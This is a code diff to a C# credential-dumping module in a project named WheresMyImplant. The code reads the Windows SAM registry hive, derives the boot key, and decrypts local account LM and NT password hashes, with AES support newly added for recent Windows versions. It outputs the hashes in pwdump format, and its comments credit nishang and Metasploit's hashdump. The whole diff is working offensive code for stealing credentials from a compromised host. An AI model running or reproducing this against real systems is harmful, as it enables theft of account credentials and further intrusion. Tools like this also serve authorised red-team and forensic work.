@@ -32,22 +32,38 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Good
+        //
         ////////////////////////////////////////////////////////////////////////////////
         internal static Byte[] GetHBootKey(Byte[] bootKey)
         {
             Byte[] F = (Byte[])Registry.LocalMachine.OpenSubKey(@"SAM\SAM\Domains\Account").GetValue("F");
-            //Byte[] F = (Byte[])RegRead.ReadRegKey(Unmanaged.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account", "F");
-            using (MD5 md5 = new MD5CryptoServiceProvider())
+            Int32 hashVersion = BitConverter.ToInt32(F.Skip(0x68).Take(4).ToArray(), 0);
+            switch (hashVersion)
             {
-                Byte[] compute = new Byte[0];
-                compute = Misc.Combine(compute, F.Skip(0x70).Take(0x10).ToArray());
-                compute = Misc.Combine(compute, qwerty);
-                compute = Misc.Combine(compute, bootKey);
-                compute = Misc.Combine(compute, numeric);
-                Byte[] rc4Key = md5.ComputeHash(compute);
-                Byte[] hBootKey = Misc.RC4Encrypt(rc4Key, F.Skip(0x80).Take(0x20).ToArray());
-                return hBootKey;
+                case 1:
+                    using (MD5 md5 = new MD5CryptoServiceProvider())
+                    {
+                        Byte[] compute = new Byte[0];
+                        compute = Misc.Combine(compute, F.Skip(0x70).Take(0x10).ToArray());
+                        compute = Misc.Combine(compute, qwerty);
+                        compute = Misc.Combine(compute, bootKey);
+                        compute = Misc.Combine(compute, numeric);
+                        Byte[] rc4Key = md5.ComputeHash(compute);
+                        return Misc.RC4Encrypt(rc4Key, F.Skip(0x80).Take(0x20).ToArray());
+                    }
+                case 2:
+                    using (Aes aes = new AesCryptoServiceProvider())
+                    {
+                        aes.Key = bootKey;
+                        aes.Padding = PaddingMode.Zeros;
+                        aes.IV = F.Skip(0x78).Take(16).ToArray();
+                        aes.Mode = CipherMode.CBC;
+                        ICryptoTransform decryptor = aes.CreateDecryptor();
+                        return decryptor.TransformFinalBlock(F, 0x88, 16);
+                    }
+                default:
+                    Console.WriteLine("Unknown hash type");
+                    return new Byte[0];
             }
         }
 
@@ -102,7 +118,8 @@ namespace WheresMyImplant
                     userKeys[i].userName = ridMapping[userKeys[i].rid];
                     userKeys[i].f = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users\" + secretSubKeys[i], "F");
                     userKeys[i].v = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users\" + secretSubKeys[i], "V");
-                    userKeys[i].userPasswordHint = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users\" + secretSubKeys[i], "UserPasswordHint");
+                    userKeys[i].userPasswordHint = (Byte[])Registry.LocalMachine.OpenSubKey(@"SAM\SAM\Domains\Account\Users\" + secretSubKeys[i]).GetValue("UserPasswordHint");
+                    //userKeys[i].userPasswordHint = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users\" + secretSubKeys[i], "UserPasswordHint");
                 }
             }
             return userKeys;
@@ -113,29 +130,23 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal void DecryptUserHashes(ref UserKeys[] userKeys, Byte[] hBootKey)
         {
+            WriteOutput("");
             foreach (UserKeys userKey in userKeys)
             {
+                Byte[] lmHashArray = {0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee};
                 String lmHash = "aad3b435b51404eeaad3b435b51404ee";
+                Byte[] ntHashArray = {0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0};
                 String ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";
 
-                Boolean lmExists = false;
-                Boolean ntExists = false;
-
                 Int32 offset = BitConverter.ToInt32(userKey.v.Skip(0x9c).Take(4).ToArray(), 0) + 0xCC;
-                if (BitConverter.ToInt32(userKey.v.Skip(0x9c + 4).Take(4).ToArray(), 0) == 20)
-                {
-                    lmExists = true;
-                    Byte[] encryptedLmHash = userKey.v.Skip(offset + 4).Take(16).ToArray();
-                    lmHash = BitConverter.ToString(decryptSingleHash(encryptedLmHash, userKey.rid, hBootKey, lmPass)).Replace("-","");
-                }
+                Int32 length = BitConverter.ToInt32(userKey.v.Skip(0xa0).Take(4).ToArray(), 0);
+                Byte[] encryptedLmHash = userKey.v.Skip(offset).Take(length).ToArray();
+                lmHash = BitConverter.ToString(Decrypt(encryptedLmHash, userKey.rid, hBootKey, lmPass, lmHashArray)).Replace("-", "");
 
-                if (BitConverter.ToInt32(userKey.v.Skip(0x9c + 16).Take(4).ToArray(), 0) == 20)
-                {
-                    ntExists = true;
-                    Byte[] encryptedNtHash = userKey.v.Skip(offset + (lmExists ? 24 : 8)).Take(16).ToArray();
-                    ntHash = BitConverter.ToString(decryptSingleHash(encryptedNtHash, userKey.rid, hBootKey, ntPass)).Replace("-","");
-
-                }
+                offset = BitConverter.ToInt32(userKey.v.Skip(0xa8).Take(4).ToArray(), 0) + 0xCC;
+                length = BitConverter.ToInt32(userKey.v.Skip(0xac).Take(4).ToArray(), 0);
+                Byte[] encryptedNtHash = userKey.v.Skip(offset).Take(length).ToArray();
+                ntHash = BitConverter.ToString(Decrypt(encryptedNtHash, userKey.rid, hBootKey, ntPass, ntHashArray)).Replace("-", "");
 
                 String pwFormat = String.Format("{0}:{1}:{2}:{3}:::", userKey.userName, userKey.rid, lmHash.ToLower(), ntHash.ToLower());
                 WriteOutput(pwFormat);
@@ -143,11 +154,40 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        //https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
+        //
         ////////////////////////////////////////////////////////////////////////////////
-        internal static Byte[] decryptSingleHash(Byte[] encryptedHash, Int32 rid, Byte[] hBootKey, Byte[] hashType)
+        private static Byte[] Decrypt(Byte[] encryptedHash, Int32 rid, Byte[] hBootKey, Byte[] hashType, Byte[] blankHash)
         {
-            Int32[][] desKeys = convertRidToDesKey(rid);
+            try
+            {
+                switch (BitConverter.ToInt16(encryptedHash.Skip(2).Take(2).ToArray(), 0))
+                {
+                    case 1:
+                        return DecryptSingleHashRC4(encryptedHash, rid, hBootKey, hashType, blankHash);
+                    case 2:
+                        return DecryptSingleHashAES(encryptedHash, rid, hBootKey, hashType, blankHash);
+                    default:
+                        return blankHash;
+                }
+            }
+            catch (Exception error)
+            {
+                return blankHash;
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        // Used for Windows 7(?) and prior
+        // https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
+        ////////////////////////////////////////////////////////////////////////////////
+        private static Byte[] DecryptSingleHashRC4(Byte[] encryptedHash, Int32 rid, Byte[] hBootKey, Byte[] hashType, Byte[] blankHash)
+        {
+            if (encryptedHash.Length < 20)
+            {
+                return blankHash;
+            }
+
+            Int32[][] desKeys = ConvertRidToDesKey(rid);
             Byte[] rc4DecryptedHash;
             using (MD5 md5 = new MD5CryptoServiceProvider())
             {               
@@ -156,15 +196,42 @@ namespace WheresMyImplant
                 Byte[] hash = md5.ComputeHash(combined);
                 rc4DecryptedHash = Misc.RC4Encrypt(hash, encryptedHash);
             }
-            Byte[] desDecryptedHash1 = decryptDes(rc4DecryptedHash.Take(8).ToArray(), desKeys[0]);
-            Byte[] desDecryptedHash2 = decryptDes(rc4DecryptedHash.Skip(8).Take(8).ToArray(), desKeys[1]);
+            Byte[] desDecryptedHash1 = DecryptDes(rc4DecryptedHash.Take(8).ToArray(), desKeys[0]);
+            Byte[] desDecryptedHash2 = DecryptDes(rc4DecryptedHash.Skip(8).Take(8).ToArray(), desKeys[1]);
             return Misc.Combine(desDecryptedHash1, desDecryptedHash2);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        //
+        // Added compatibility for newer versions of windows
+        // https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/hashdump.rb
         ////////////////////////////////////////////////////////////////////////////////
-        internal static Byte[] decryptDes(Byte[] encrytped, Int32[] key)
+        private static Byte[] DecryptSingleHashAES(Byte[] encryptedHash, Int32 rid, Byte[] hBootKey, Byte[] hashType, Byte[] blankHash)
+        {
+            if (encryptedHash.Length < 40)
+            {
+                return blankHash;
+            }
+
+            Int32[][] desKeys = ConvertRidToDesKey(rid);
+            Byte[] aesDecryptedHash;
+            using (Aes aes = new AesCryptoServiceProvider())
+            {
+                aes.Key = hBootKey.Take(16).ToArray();
+                aes.Padding = PaddingMode.Zeros;
+                aes.IV = encryptedHash.Skip(8).Take(16).ToArray();
+                aes.Mode = CipherMode.CBC;
+                ICryptoTransform decryptor = aes.CreateDecryptor();
+                aesDecryptedHash = decryptor.TransformFinalBlock(encryptedHash, 24, 16);
+            }
+            Byte[] desDecryptedHash1 = DecryptDes(aesDecryptedHash.Take(8).ToArray(), desKeys[0]);
+            Byte[] desDecryptedHash2 = DecryptDes(aesDecryptedHash.Skip(8).Take(8).ToArray(), desKeys[1]);
+            return Misc.Combine(desDecryptedHash1, desDecryptedHash2);
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        // 
+        ////////////////////////////////////////////////////////////////////////////////
+        private static Byte[] DecryptDes(Byte[] encrytped, Int32[] key)
         {
             Byte[] desKey = new Byte[key.Length];
             for (Int32 i = 0; i < key.Length; i++)
@@ -189,7 +256,7 @@ namespace WheresMyImplant
         //Good
         //https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
         ////////////////////////////////////////////////////////////////////////////////
-        internal static Int32[][] convertRidToDesKey(Int32 rid)
+        private static Int32[][] ConvertRidToDesKey(Int32 rid)
         {
             Byte b0 = Convert.ToByte(rid & 255);
             Byte b1 = Convert.ToByte((rid & 65280) / 256);
@@ -199,14 +266,14 @@ namespace WheresMyImplant
             //Byte[] desKey1 = new Byte[0];
             Byte[] desKey1 = { b0, b1, b2, b3, b0, b1, b2 };
             Byte[] desKey2 = { b3, b0, b1, b2, b3, b0, b1 };
-            Int32[][] keys = { convertRidToDesKey2(desKey1), convertRidToDesKey2(desKey2) };
+            Int32[][] keys = { ConvertRidToDesKey2(desKey1), ConvertRidToDesKey2(desKey2) };
             return keys;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         //https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
         ////////////////////////////////////////////////////////////////////////////////
-        internal static Int32[] convertRidToDesKey2(Byte[] key)
+        private static Int32[] ConvertRidToDesKey2(Byte[] key)
         {
             Int32 k0 = (Int32)Math.Floor(key[0] * .5);
             Int32 k1 = (key[0] & 0x01) * 64 | (Int32)Math.Floor(key[1] * .25);
